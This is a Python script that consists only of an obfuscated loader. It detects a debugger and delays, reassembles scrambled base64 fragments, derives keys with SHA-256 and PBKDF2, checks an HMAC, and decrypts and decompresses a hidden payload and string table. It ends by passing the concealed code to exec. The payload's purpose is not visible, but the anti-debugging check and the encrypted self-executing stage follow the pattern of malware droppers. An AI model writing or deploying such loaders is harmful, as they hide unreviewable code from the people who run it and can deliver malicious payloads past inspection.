import base64, zlib, json, hashlib, hmac, sys, time
import sys, time
tracef = getattr(sys, 'gettrace', None)
if tracef and tracef():
    time.sleep(5)
_ae5313_0 = 'rqyX3Qgp58ZX6zU9VfCN3+zD9driwlPzbKgT8oun'
_ae5313_1 = 'KplRPodbFrexd4rs9YLH9BWaR6/xfQ18'
_ae5313_2 = 'fCIr/v7oLMC3'
_ae5313_3 = '+bqGqzFTQVIoFyADbyIW/ZlY'
_ae5313_4 = 'J0pNJuR+TwTt4h0OjBzz+XyrnJ0PgpuY09C'
_ae5313_5 = 'MRq5k3AoEQ0r0QhNTu+JN4imEOzSvovB4kDXE7Tf8QqtV'
_pls = [_ae5313_0, _ae5313_1, _ae5313_2, _ae5313_3, _ae5313_4, _ae5313_5]
_407579 = [(34772,41140,2),(44372,10756,2),(15017,59527,2),(17076,40157,2),(22836,11917,2),(44899,42456,2),(47247,52892,2),(48364,55861,2),(47015,55618,2),(56848,39715,2),(99,60726,2),(12087,59255,2),(617,14495,2),(22583,16518,2),(25224,38518,2),(16542,38339,2),(0,0,0),(0,0,0)]
_068415 = 'J2CHUA=='
_bf5a2a = 'dN+SENWpOW1hEDl2'
_a64626 = 'TdnkUz90yRo='
_f6f1f3 = [0, 3, 5, 1, 2, 4]
_salt = base64.b64decode(_a64626)
mhash = hashlib.sha256((__name__ + '|' + repr(globals().get('__file__',''))).encode('utf-8') + _salt).digest()
rbytes = list(mhash)
_perm = list(range(len(_pls)))
for _i in range(len(_perm)-1, 0, -1):
    _j = (rbytes[_i % len(rbytes)] + _i) % (_i + 1)
    _perm[_i], _perm[_j] = _perm[_j], _perm[_i]
_idxs = _f6f1f3
_assembled_list = []
_npls = len(_pls)
for _i in range(_npls):
    _pos = None
    try:
        _pos = _idxs.index(_i)
    except Exception:
        _pos = None
    if _pos is not None:
        _assembled_list.append(_pls[_pos])
_assembled = ''.join(_assembled_list)
_f2d5ff = base64.b64decode(_assembled)
_c2dce5 = 32
_20ce47 = _f2d5ff[:-_c2dce5]
_c2dce5 = _f2d5ff[-_c2dce5:]
_07fb77 = (lambda P: b''.join(((v ^ m).to_bytes(l, 'big') for (v,m,l) in P if l)))(_407579)
_hdr = base64.b64decode(_068415)
_nonce = base64.b64decode(_bf5a2a)
_km_seed = hashlib.sha256(_07fb77 + _hdr + _nonce).digest()
_km = hashlib.pbkdf2_hmac('sha256', _km_seed, _nonce, 100000, dklen=32)
_blob_seed = hashlib.sha256(_km + b'blob').digest()
_blob_k = hashlib.pbkdf2_hmac('sha256', _blob_seed, _nonce, 20000, dklen=32)
_calc_tag = hmac.new(_blob_k, _20ce47, hashlib.sha256).digest()
if _calc_tag != _c2dce5:
    raise RuntimeError('integrity check failed')
_bs = b''
_ctr = 0
_need = len(_20ce47)
while len(_bs) < _need:
    _bs += hashlib.sha256(_blob_k + _ctr.to_bytes(4, 'little')).digest()
    _ctr += 1
_raw = bytes(a ^ b for a, b in zip(_20ce47, _bs[:_need]))
_dec = zlib.decompress(_raw).decode('utf-8')
_J = json.loads(_dec)
mmap = {}
for _i, _enc in enumerate(_J['strs']):
    _c = base64.b64decode(_enc)
    _seed = hashlib.sha256(_km + b'str' + _i.to_bytes(4, 'little')).digest()
    _ks = b''
    _ctr = 0
    _need = len(_c)
    while len(_ks) < _need:
        _ks += hashlib.sha256(_seed + _ctr.to_bytes(4, 'little')).digest()
        _ctr += 1
    _pt = bytes(a ^ b for a, b in zip(_c, _ks[:_need]))
    mmap[str(_i)] = _pt.decode('utf-8')
globals()['_1e1958'] = mmap
globals()['_78e21f'] = lambda i: globals()['_1e1958'][str(i)]
_x = globals()['_78e21f']
exec(compile(_J['s'], '<obf>', 'exec'), globals())
